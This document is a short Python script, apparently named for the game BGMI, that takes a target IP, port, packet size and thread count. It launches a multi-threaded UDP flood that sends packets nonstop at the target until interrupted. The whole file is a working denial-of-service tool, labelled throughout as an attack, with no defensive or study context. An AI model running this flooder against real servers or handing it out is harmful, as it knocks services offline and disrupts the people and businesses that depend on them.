#!/usr/bin/env python3
import sys
import socket
import threading
import signal

if len(sys.argv) < 5:
    print("Usage: ./bgmi.py <IP> <PORT> <PACKET_SIZE> <NUM_THREADS>")
    sys.exit(1)

IP = sys.argv[1]
PORT = int(sys.argv[2])
PACKET_SIZE = int(sys.argv[3])
NUM_THREADS = int(sys.argv[4])

stop_flag = False
data = bytearray(PACKET_SIZE)

def signal_handler(sig, frame):
    global stop_flag
    stop_flag = True
    print("\n[+] Stopping attack...")

signal.signal(signal.SIGINT, signal_handler)

def spam():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_flag:
        try:
            sock.sendto(data, (IP, PORT))
        except:
            pass

threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=spam)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"[+] Attacking {IP}:{PORT} with {NUM_THREADS} threads, {PACKET_SIZE} bytes per packet. Ctrl+C to stop.")

for t in threads:
    t.join()

print("[+] Attack stopped.")
